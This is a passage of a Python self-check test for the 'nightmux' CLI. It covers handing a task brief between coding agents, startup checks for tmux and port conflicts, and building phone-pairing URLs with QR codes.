            assert open(hp_, encoding="utf-8").read().startswith("# 🧬") and ".nightmux/" in open(
                os.path.join(repo_, ".git", "info", "exclude")).read().split()
            code_, out_, err_ = hand_("codex", "also", "add", "tests")
            assert code_ is None and len(execs_) == 1 and execs_[0][0] == "/bin/sh", (code_, execs_, err_)
            assert execs_[0][1].startswith("claude was working in this directory") and hp_ in execs_[0][1], execs_
            assert execs_[0][1].endswith("Next instruction:\nalso add tests"), execs_
            assert "claude → codex" in out_ and "last instruction: add retry to the uploader" in out_, out_
            hand_("opencode")
            assert execs_[-1][:2] == ["/bin/sh", "--prompt"] and len(execs_[-1]) == 3, execs_
            hand_("codex", "--setup")       # instruction text, not a flag: nothing else runs
            assert execs_[-1][1].endswith("Next instruction:\n--setup") and "setup" not in ran_, (execs_[-1], ran_)
            n_ = len(execs_)
            code_, out_, err_ = hand_("agy")
            assert "/nonexistent/agy is not installed" in code_ and "add retry to the uploader" not in code_ and len(execs_) == n_, code_
            code_, out_, err_ = hand_("aider")
            assert "does not know how to start aider" in code_ and hp_ in code_ and len(execs_) == n_, code_
            code_, out_, err_ = hand_("nope")
            assert code_ == 2 and "unknown agent 'nope'" in err_ and "usage: nightmux handoff" in err_ and not out_, (code_, err_)
            code_, out_, err_ = cli_("handoff", "--help")
            assert code_ is None and out_.startswith("usage: nightmux handoff") and "codex" in out_ and not err_, out_
            # outside a repo: nothing is written, and the brief rides in the prompt
            plain_ = os.path.join(hh_, "plain")
            os.makedirs(plain_)
            code_, out_, err_ = hand_(where=plain_)
            assert code_ is None and "not a git repo" in out_ and not os.path.exists(os.path.join(plain_, ".nightmux")), out_
            hand_("codex", where=plain_)
            assert "## Last Instruction" in execs_[-1][1] and ".nightmux" not in execs_[-1][1], execs_[-1]
        # `up`: tmux first, then no second copy, then the daemon
        from types import SimpleNamespace
        has_ = SimpleNamespace(which=lambda c: "/usr/bin/" + c)
        with stubbed(shutil=SimpleNamespace(which=lambda c: None if c == "tmux" else "/usr/bin/" + c)):
            code_, out_, err_ = cli_("up")
        assert "tmux is not installed" in code_ and "brew install tmux" in code_ and not ran_, code_
        busy_ = socket.socket()
        busy_.bind(("127.0.0.1", 0))
        busy_.listen(1)
        uport_ = busy_.getsockname()[1]
        with stubbed(shutil=has_, load_cfg=lambda: {"webhook_port": uport_}):
            code_, out_, err_ = cli_("up")
        assert "already in use" in code_ and "second copy" in code_ and not ran_, code_
        busy_.close()
        with stubbed(shutil=has_, load_cfg=lambda: {"webhook_port": uport_}):
            code_, out_, err_ = cli_("up")
        assert code_ is None and ran_ == ["daemon"] and "agents found:" in out_ and "claude" in out_, (code_, out_, ran_)
        ran_.clear()
        code_, out_, err_ = cli_("up", "now")
        assert code_ == 2 and "usage: nightmux up" in err_ and not out_ and not ran_, (code_, err_)
        # ...and the phone line: no route, no QR; a route, a QR whose code is still good
        n_ = len(_pairing_codes)
        with stubbed(phone_url=lambda cfg, status=None: None):
            msg_ = phone_pairing({"webhook_host": "127.0.0.1", "webhook_port": 7070})
        assert "tailscale serve --bg 7070" in msg_ and "pair?code" not in msg_ and len(_pairing_codes) == n_, msg_
        with stubbed(phone_url=lambda cfg, status=None: "https://box.ts.net"):
            msg_ = phone_pairing({"webhook_host": "127.0.0.1"})
        code_ = re.search(r"https://box\.ts\.net/pair\?code=([\w-]+)", msg_).group(1)
        assert code_ in _pairing_codes and ("▄" in msg_ or "█" in msg_), msg_
        with stubbed(phone_url=lambda cfg, status=None: None, get_local_ip=lambda: "192.168.1.5"):
            msg_ = phone_pairing({"webhook_host": "0.0.0.0", "webhook_port": 7070})
        assert "http://192.168.1.5:7070/pair?code=" in msg_, msg_
        assert cli_() == (None, "", "") and ran_ == ["daemon"], ran_
    print("selfcheck ok")
